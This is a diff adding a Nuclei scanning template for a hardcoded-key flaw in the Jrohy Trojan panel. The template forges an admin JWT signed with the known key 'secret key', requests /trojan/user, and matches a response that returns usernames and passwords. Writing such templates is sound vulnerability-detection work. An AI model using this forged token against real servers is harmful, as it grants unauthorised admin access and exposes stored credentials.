@@ -1,0 +1,29 @@
+id: jrohy-trojan-hard-coded-key
+info:
+  name: Jrohy Trojan Hardcoded Key Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: hardcoded-credentials
+
+variables:
+  jwt: '{{generate_jwt("{\"exp\":3939014838, \"id\":\"admin\", \"orig_iat\":1939014838}", "HS256", "secret key")}}'
+
+http:
+  - raw:
+      - |
+        GET /trojan/user HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{jwt}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"Data":'
+          - '"Username":'
+          - '"Password":'
+          - '"Msg":"success"'
+        part: body
